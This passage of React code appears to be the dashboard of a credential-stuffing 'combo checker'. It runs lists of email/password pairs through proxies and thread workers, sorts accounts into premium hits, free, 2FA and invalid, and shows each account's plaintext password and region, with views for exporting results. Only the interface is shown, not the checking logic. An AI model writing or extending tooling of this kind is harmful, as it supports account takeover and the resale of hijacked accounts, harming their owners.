                      <div className="flex items-center gap-1.5 overflow-x-auto py-3 scrollbar-none shrink-0 border-b border-white/5">
                        <button
                          onClick={() => setDashboardFeedTab('all')}
                          className={`py-1 px-2.5 rounded-full text-[10px] uppercase font-bold transition-all whitespace-nowrap cursor-pointer ${
                            dashboardFeedTab === 'all'
                              ? 'bg-[#FF6400] text-black font-black'
                              : 'bg-black/35 text-white/55 hover:text-white'
                          }`}
                        >
                          All ({combos.filter(c => c.status !== 'unchecked').length})
                        </button>
                        <button
                          onClick={() => setDashboardFeedTab('hits')}
                          className={`py-1 px-2.5 rounded-full text-[10px] uppercase font-bold transition-all whitespace-nowrap cursor-pointer ${
                            dashboardFeedTab === 'hits'
                              ? 'bg-emerald-500 text-black font-black'
                              : 'bg-black/35 text-emerald-450 hover:bg-emerald-950/20'
                          }`}
                        >
                          Hits ({combos.filter(c => c.status === 'hit_premium').length})
                        </button>
                        <button
                          onClick={() => setDashboardFeedTab('free')}
                          className={`py-1 px-2.5 rounded-full text-[10px] uppercase font-bold transition-all whitespace-nowrap cursor-pointer ${
                            dashboardFeedTab === 'free'
                              ? 'bg-sky-500 text-black font-black'
                              : 'bg-black/35 text-sky-450 hover:bg-sky-950/25'
                          }`}
                        >
                          Free ({combos.filter(c => c.status === 'free').length})
                        </button>
                        <button
                          onClick={() => setDashboardFeedTab('invalid')}
                          className={`py-1 px-2.5 rounded-full text-[10px] uppercase font-bold transition-all whitespace-nowrap cursor-pointer ${
                            dashboardFeedTab === 'invalid'
                              ? 'bg-rose-500 text-white font-black'
                              : 'bg-black/35 text-rose-450 hover:bg-rose-950/25'
                          }`}
                        >
                          Bad ({combos.filter(c => c.status === 'invalid').length})
                        </button>
                        <button
                          onClick={() => setDashboardFeedTab('2fa')}
                          className={`py-1 px-2.5 rounded-full text-[10px] uppercase font-bold transition-all whitespace-nowrap cursor-pointer ${
                            dashboardFeedTab === '2fa'
                              ? 'bg-amber-500 text-black font-black'
                              : 'bg-black/35 text-amber-450 hover:bg-amber-950/25'
                          }`}
                        >
                          2FA ({combos.filter(c => c.status === '2fa').length})
                        </button>
                      </div>

                      {/* Display items list container */}
                      <div className="flex-1 overflow-y-auto mt-3.5 space-y-2 pr-0.5 scrollbar-none font-mono">
                        {combos.filter(c => c.status !== 'unchecked').length === 0 ? (
                          <div className="flex flex-col justify-center items-center h-full text-center p-8 text-white/20 select-none">
                            <Layers className="w-8 h-8 text-white/5 stroke-1 mb-2 animate-pulse" />
                            <span className="text-xs font-sans">No accounts have been verified in this session.</span>
                            <span className="text-[10px] font-sans block mt-1 text-white/10">Click "Launch Checker" to trigger thread workers.</span>
                          </div>
                        ) : dashboardCheckedCombos.length === 0 ? (
                          <div className="flex flex-col justify-center items-center h-full text-center p-8 text-white/20 select-none">
                            <span className="text-xs font-sans">No verified items match the ["{dashboardFeedTab}"] category view filters.</span>
                          </div>
                        ) : (
                          [...dashboardCheckedCombos].reverse().slice(0, 50).map(item => (
                            <motion.div
                              key={item.id}
                              initial={{ opacity: 0, x: -6 }}
                              animate={{ opacity: 1, x: 0 }}
                              className="flex items-center justify-between p-3 bg-black/30 hover:bg-white/5 border border-white/5 rounded-xl transition-all group duration-150"
                            >
                              <div className="flex items-center space-x-3 min-w-0 pr-3">
                                <span className={`w-2 h-2 rounded-full shrink-0 ${
                                  item.status === 'hit_premium' ? 'bg-emerald-500 animate-ping' :
                                  item.status === 'free' ? 'bg-sky-400' :
                                  item.status === '2fa' ? 'bg-amber-400' :
                                  item.status === 'error' ? 'bg-purple-500' :
                                  'bg-rose-500'
                                }`} />
                                <div className="min-w-0">
                                  <p className="text-xs font-bold text-slate-200 truncate select-all font-mono" title={item.email}>
                                    {item.email}
                                  </p>
                                  <span className="text-[10px] text-white/30 font-mono block mt-0.5 whitespace-nowrap">
                                    Pass: <span className="text-white/45">{item.pass}</span> {item.country && item.country !== 'N/A' && `• Region: ${item.country}`}
                                  </span>
                                </div>
                              </div>
                              <div className="flex items-center space-x-2 shrink-0 select-none">
                                <span className={`text-[9.5px] uppercase font-extrabold font-mono py-0.5 px-2 rounded tracking-wide ${
                                  item.status === 'hit_premium' ? 'bg-emerald-950/40 text-emerald-400 border border-emerald-900/40' :
                                  item.status === 'free' ? 'bg-sky-950/40 text-sky-450 border border-sky-900/40' :
                                  item.status === '2fa' ? 'bg-amber-950/40 text-amber-500 border border-amber-950/50' :
                                  item.status === 'error' ? 'bg-purple-950/40 text-purple-400 border border-purple-950/50' :
                                  'bg-rose-950/40 text-rose-450 border border-rose-950/50'
                                }`}>
                                  {item.status === 'hit_premium' ? item.tier : item.status === 'free' ? 'Free' : item.status === '2fa' ? '2FA Code' : item.status === 'error' ? 'Retry Socket' : 'Invalid'}
                                </span>
                                <button
                                  onClick={() => setSelectedComboForInspection(item)}
                                  className="py-1 px-2.5 bg-[#252525] group-hover:bg-[#FF6400] text-slate-350 group-hover:text-black font-black uppercase text-[9px] font-sans tracking-wide rounded-lg transition-all cursor-pointer"
                                  title="Inspect capture elements"
                                >
                                  Inspect
                                </button>
                              </div>
                            </motion.div>
                          ))
                        )}
                      </div>
                    </div>

                    {/* Right column: console output preview */}
                    <div className="lg:col-span-5 h-[460px] flex flex-col">
                      <ConsoleLog logs={logs.slice(-30)} clearLogs={() => setLogs([])} />
                    </div>
                  </div>
                </div>
              )}

              {/* COMBOS VIEW */}
              {view === 'combos' && (
                <ComboManager combos={combos} setCombos={setCombos} addLog={addLog} />
              )}

              {/* PROXIES VIEW */}
              {view === 'proxies' && (
                <ProxyManager proxies={proxies} setProxies={setProxies} addLog={addLog} />
              )}

              {/* RESULTS DATABASE VIEW */}
              {view === 'results' && (
                <ResultsExport combos={combos} setCombos={setCombos} addLog={addLog} />
              )}

              {/* STREAMING CONSOLE VIEW */}
              {view === 'logs' && (
                <ConsoleLog logs={logs} clearLogs={() => setLogs([])} />
              )}

              {/* EDUCATIONAL CODE SOURCE VIEW */}
              {view === 'code' && (
                <CodePresetsHub />
              )}

              {/* SETTINGS ENGINE VIEW */}
              {view === 'settings' && (
                <SettingsPanel config={config} setConfig={setConfig} addLog={addLog} />
              )}
            </motion.div>
          </AnimatePresence>
        </main>
      </div>

      {/* Account Metadata Deep Inspection Modal */}
      <AccountInspectorModal
        combo={selectedComboForInspection}
        onClose={() => setSelectedComboForInspection(null)}
        addLog={addLog}
      />
    </div>
  );
}
